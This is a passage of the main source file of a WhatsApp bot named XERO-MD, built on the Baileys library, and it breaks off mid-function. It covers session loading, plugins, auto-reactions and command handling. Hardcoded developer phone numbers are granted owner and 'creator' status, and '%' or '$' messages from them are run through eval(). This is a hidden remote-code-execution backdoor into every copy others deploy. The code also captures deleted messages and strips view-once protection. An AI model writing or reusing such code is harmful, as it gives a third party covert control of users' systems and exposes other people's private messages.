const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys')
  
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const config = require('./config')
  const GroupEvents = require('./lib/groupevents');
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  const prefix = config.PREFIX
  
  const ownerNumber = ['255763111390', '255610209120']
  
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);
  
  //===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions')) {
    fs.mkdirSync(__dirname + '/sessions');
}
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
const sessdata = config.SESSION_ID.replace("XERO-MD>>>", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
console.log("Session downloaded ✅")
})})}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
  
  //=============================================
  
  // Command Handler System
  const commands = new Map();
  const aliases = new Map();
  
  function registerCommand(cmd) {
      if (cmd.command) {
          commands.set(cmd.command, cmd);
          if (cmd.alias && Array.isArray(cmd.alias)) {
              cmd.alias.forEach(alias => {
                  aliases.set(alias, cmd.command);
              });
          }
      }
  }
  
  function getCommand(cmdName) {
      let command = commands.get(cmdName);
      if (!command && aliases.has(cmdName)) {
          command = commands.get(aliases.get(cmdName));
      }
      return command;
  }
  
  async function connectToWA() {
  console.log("Connecting to WhatsApp ⏳️...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  var { version } = await fetchLatestBaileysVersion()
  
  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version
          })
      
  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update
  if (connection === 'close') {
  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
  connectToWA()
  }
  } else if (connection === 'open') {
  console.log('🧬 Installing Plugins')
  
  // Create plugins folder if not exists
  if (!fs.existsSync("./plugins")) {
      fs.mkdirSync("./plugins");
      console.log('📁 Created plugins folder');
  }
  
  // Load plugins
  const pluginFiles = fs.readdirSync("./plugins/").filter(file => file.endsWith('.js'));
  console.log(`📦 Found ${pluginFiles.length} plugins`);
  
  pluginFiles.forEach((plugin) => {
      try {
          const pluginModule = require("./plugins/" + plugin);
          if (pluginModule.command || pluginModule.commands) {
              if (pluginModule.commands && Array.isArray(pluginModule.commands)) {
                  pluginModule.commands.forEach(cmd => {
                      registerCommand({
                          command: cmd,
                          function: pluginModule.function,
                          alias: pluginModule.alias || [],
                          description: pluginModule.description || 'No description'
                      });
                  });
              } else if (pluginModule.command) {
                  registerCommand({
                      command: pluginModule.command,
                      function: pluginModule.function,
                      alias: pluginModule.alias || [],
                      description: pluginModule.description || 'No description'
                  });
              }
              console.log(`✅ Loaded: ${plugin} - ${pluginModule.command || pluginModule.commands?.join(', ')}`);
          } else {
              console.log(`⚠️ ${plugin} has no command export`);
          }
      } catch(e) {
          console.log(`❌ Failed: ${plugin} - ${e.message}`);
      }
  });
  
  // Register default commands if no plugins found
  if (commands.size === 0) {
      console.log('📝 No plugins found, registering default commands...');
      
      // Default Menu Command
      registerCommand({
          command: 'menu',
          alias: ['help', 'cmd'],
          description: 'Show bot menu',
          function: async (conn, mek, m, { from, reply, pushname, prefix, isOwner }) => {
              const menu = `╭━━━━━━━━━━━━━━━╮
│  *XERO-MD MENU*
╰━━━━━━━━━━━━━━━╯

╭─〔 COMMANDS 〕─╮
│ • ${prefix}menu - Show menu
│ • ${prefix}ping - Check bot
│ • ${prefix}owner - Contact owner
│ • ${prefix}alive - Check status
│ • ${prefix}runtime - Bot uptime
╰───────────────╯

> Powered by nyoni-xmd`;
              reply(menu);
          }
      });
      
      // Ping Command
      registerCommand({
          command: 'ping',
          description: 'Check bot response time',
          function: async (conn, mek, m, { reply }) => {
              reply('🏓 Pong! Bot is alive ✅');
          }
      });
      
      // Alive Command
      registerCommand({
          command: 'alive',
          alias: ['alive'],
          description: 'Check if bot is online',
          function: async (conn, mek, m, { reply }) => {
              reply('✨ XERO-MD is alive and running! ✨');
          }
      });
      
      // Owner Command
      registerCommand({
          command: 'owner',
          alias: ['creator', 'dev'],
          description: 'Show owner info',
          function: async (conn, mek, m, { reply }) => {
              reply(`👑 *Owner Information*
╭━━━━━━━━━━━━━━━╮
│ Name: nyoni-xmd
│ Number: +255763111390
│ Number2: +255610209120
╰━━━━━━━━━━━━━━━╯`);
          }
      });
      
      // Runtime Command
      registerCommand({
          command: 'runtime',
          description: 'Show bot uptime',
          function: async (conn, mek, m, { reply }) => {
              const runtime = process.uptime();
              const hours = Math.floor(runtime / 3600);
              const minutes = Math.floor((runtime % 3600) / 60);
              const seconds = Math.floor(runtime % 60);
              reply(`⏰ Bot Uptime: ${hours}h ${minutes}m ${seconds}s`);
          }
      });
      
      console.log(`✅ Registered ${commands.size} default commands`);
  }
  
  console.log('Plugins installed successful ✅')
  console.log('XERO-MD CONNECTED SUCCESSFULLY ✅')
  
  let up = `*╭┈───────────────╮*
*│ ◦* *XERO MD ᴄᴏɴᴇᴄᴛᴇᴅ*
*│ ◦* *ᴅᴇᴠ* : *nyoni-xmd*
*│ ◦* *sᴀᴛᴜs* : *ᴏɴʟʏ*
*│ ◦* *ɴᴜᴍʙᴇʀ 1* : +255763111390
*│ ◦* *ɴᴜᴍʙᴇʀ 2* : +255610209120
*│  ◦* *ᴘʀᴇғɪx: ${config.PREFIX}*
*│  ◦* *ᴍᴏᴅᴇ: ${config.MODE}*
*│  ◦* *ᴛʏᴘᴇ : ${config.PREFIX}menu* 
*╰┈───────────────╯*
> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ nyoni-xmd*`;
    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/gyaka2.png` }, caption: up })
  }
  })
  conn.ev.on('creds.update', saveCreds)

  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //============================== 

  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
	  
  //=============readstatus=======
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
  if (config.READ_MESSAGE === 'true') {
    await conn.readMessages([mek.key]);  // Mark message as read
    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
  }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key])
    }
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const jawadlike = await conn.decodeJid(conn.user.id);
    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant, jawadlike] });
  }                       
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  const user = mek.key.participant
  const text = `${config.AUTO_STATUS_MSG}`
  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'Sin Nombre'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
  const udp = botNumber.split('@')[0];
    const jawad = ('255763111390', '255610209120', '255763111390');
    let isCreator = [udp, jawad, config.DEV]
					.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('%')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else reply(util.format(err));
					}
					return;
				}
 //================ownerreact==============
    
if (senderNumber.includes("255763111390") && !isReact) {
  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
  m.react(randomReaction);
}

  //==========public react============//
  
// Auto React for all messages (public and owner)
if (!isReact && config.AUTO_REACT === 'true') {
    const reactions = [
        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
    ];

    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
          
// custum react settings        
                        
// Custom React for all messages (public and owner)
if (!isReact && config.CUSTOM_REACT === 'true') {
    // Use custom emojis from the configuration (fallback to default if not set)
    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
        
  //==========WORKTYPE============ 
  if(!isOwner && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return
   
  // NEW COMMAND HANDLER - Using the registered commands
  if (isCmd) {
      const cmd = getCommand(command);
      if (cmd) {
          try {
              console.log(`📝 Executing command: ${command} from ${senderNumber}`);
              if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
              await cmd.function(conn, mek, m, {
                  from, quoted, body, isCmd, command, args, q, text, 
                  isGroup, sender, senderNumber, botNumber2, botNumber, 
                  pushname, isMe, isOwner, isCreator, groupMetadata, 
                  groupName, participants, groupAdmins, isBotAdmins, 
                  isAdmins, reply, prefix
              });
          } catch (e) {
              console.error("[COMMAND ERROR] " + e);
              reply(`❌ Error: ${e.message}`);
          }
      } else {
          // Optional: reply for unknown command
          // reply(`Unknown command. Type ${prefix}menu for available commands.`);
      }
  }
  
  });
    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (
          (decode.user &&
            decode.server &&
            decode.user + '@' + decode.server) ||
          jid
        );
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = {
              ...message.message.viewOnceMessage.message
          }
      }
    
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo ? {
              contextInfo:
